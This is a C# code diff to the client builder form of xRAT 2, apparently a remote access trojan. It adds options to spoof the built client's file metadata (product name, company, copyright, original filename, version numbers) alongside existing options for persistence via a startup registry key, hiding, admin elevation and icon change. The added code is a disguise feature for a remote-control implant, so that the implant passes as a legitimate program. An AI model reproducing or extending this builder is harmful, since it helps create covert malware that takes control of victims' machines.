@@ -1,6 +1,7 @@
 ﻿using Core;
 using Core.Build;
 using System;
+using System.Text.RegularExpressions;
 using System.Windows.Forms;
 using xRAT_2.Settings;
 
@@ -30,6 +31,17 @@ namespace xRAT_2.Forms
             txtRegistryKeyName.Text = pm.ReadValue("RegistryName");
             chkElevation.Checked = bool.Parse(pm.ReadValue("AdminElevation"));
             chkIconChange.Checked = bool.Parse(pm.ReadValue("ChangeIcon"));
+
+            // new profile options - fallback for old version
+            chkChangeAsmInfo.Checked = bool.Parse((!string.IsNullOrEmpty(pm.ReadValue("ChangeAsmInfo"))) ? pm.ReadValue("ChangeAsmInfo") : "False");
+            txtProductName.Text = pm.ReadValue("ProductName");
+            txtDescription.Text = pm.ReadValue("Description");
+            txtCompanyName.Text = pm.ReadValue("CompanyName");
+            txtCopyright.Text = pm.ReadValue("Copyright");
+            txtTrademarks.Text = pm.ReadValue("Trademarks");
+            txtOriginalFilename.Text = pm.ReadValue("OriginalFilename");
+            txtProductVersion.Text = pm.ReadValue("ProductVersion");
+            txtFileVersion.Text = pm.ReadValue("FileVersion");
         }
 
         private void SaveProfile(string profilename)
@@ -49,6 +61,15 @@ namespace xRAT_2.Forms
             pm.WriteValue("RegistryName", txtRegistryKeyName.Text);
             pm.WriteValue("AdminElevation", chkElevation.Checked.ToString());
             pm.WriteValue("ChangeIcon", chkIconChange.Checked.ToString());
+            pm.WriteValue("ChangeAsmInfo", chkChangeAsmInfo.Checked.ToString());
+            pm.WriteValue("ProductName", txtProductName.Text);
+            pm.WriteValue("Description", txtDescription.Text);
+            pm.WriteValue("CompanyName", txtCompanyName.Text);
+            pm.WriteValue("Copyright", txtCopyright.Text);
+            pm.WriteValue("Trademarks", txtTrademarks.Text);
+            pm.WriteValue("OriginalFilename", txtOriginalFilename.Text);
+            pm.WriteValue("ProductVersion", txtProductVersion.Text);
+            pm.WriteValue("FileVersion", txtFileVersion.Text);
         }
 
         private void frmBuilder_Load(object sender, EventArgs e)
@@ -70,6 +91,8 @@ namespace xRAT_2.Forms
             chkStartup.Enabled = chkInstall.Checked;
 
             txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
+
+            ToggleAsmInfoControls();
         }
 
         private void frmBuilder_FormClosing(object sender, FormClosingEventArgs e)
@@ -158,6 +181,11 @@ namespace xRAT_2.Forms
             txtRegistryKeyName.Enabled = chkStartup.Checked;
         }
 
+        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
+        {
+            ToggleAsmInfoControls();
+        }
+
         private void RefreshExamplePath()
         {
             string path = string.Empty;
@@ -209,7 +237,25 @@ namespace xRAT_2.Forms
                         {
                             try
                             {
-                                ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallpath(), chkElevation.Checked, icon);
+                                string[] asmInfo = null;
+                                if (chkChangeAsmInfo.Checked)
+                                {
+                                    if (!IsValidVersionNumber(txtProductVersion.Text) || !IsValidVersionNumber(txtFileVersion.Text))
+                                    {
+                                        MessageBox.Show("Please enter a valid version number!\nExample: 1.0.0.0", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                                        return;
+                                    }
+                                    asmInfo = new string[8];
+                                    asmInfo[0] = txtProductName.Text;
+                                    asmInfo[1] = txtDescription.Text;
+                                    asmInfo[2] = txtCompanyName.Text;
+                                    asmInfo[3] = txtCopyright.Text;
+                                    asmInfo[4] = txtTrademarks.Text;
+                                    asmInfo[5] = txtOriginalFilename.Text;
+                                    asmInfo[6] = txtProductVersion.Text;
+                                    asmInfo[7] = txtFileVersion.Text;
+                                }
+                                ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallpath(), chkElevation.Checked, icon, asmInfo);
                                 MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                             }
                             catch (Exception ex)
@@ -227,8 +273,6 @@ namespace xRAT_2.Forms
             else
                 MessageBox.Show("Please fill out all required fields!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
-
-
 
         private int GetInstallpath()
         {
@@ -255,6 +299,26 @@ namespace xRAT_2.Forms
                 default:
                     return rbAppdata;
             }
+        }
+
+        private void ToggleAsmInfoControls()
+        {
+            this.Invoke((MethodInvoker)delegate
+            {
+                foreach (Control ctrl in groupAsmInfo.Controls)
+                {
+                    if (ctrl is Label)
+                        ((Label)ctrl).Enabled = chkChangeAsmInfo.Checked;
+                    else if (ctrl is TextBox)
+                        ((TextBox)ctrl).Enabled = chkChangeAsmInfo.Checked;
+                }
+            });
+        }
+
+        private bool IsValidVersionNumber(string input)
+        {
+            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
+            return match.Success;
         }
     }
 }
